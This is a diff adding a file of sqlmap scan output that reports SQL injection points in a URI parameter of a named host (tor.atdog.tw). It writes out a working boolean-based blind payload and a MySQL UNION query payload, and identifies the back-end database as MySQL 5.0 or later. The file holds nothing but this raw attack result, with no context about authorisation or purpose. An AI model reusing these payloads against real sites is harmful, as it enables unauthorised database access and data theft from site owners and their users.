@@ -1,0 +1,13 @@
+sqlmap identified the following injection points with a total of 58 HTTP(s) requests:
+---
+Place: URI
+Parameter: #1*
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: http://tor.atdog.tw:80/news/1) AND 6575=6575 AND (8729=8729
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 5 columns
+    Payload: http://tor.atdog.tw:80/news/1) UNION ALL SELECT NULL,CONCAT(0x7178657571,0x436c72625778424e6462,0x7175727971),NULL,NULL,NULL#
+---
+back-end DBMS: MySQL >= 5.0.0
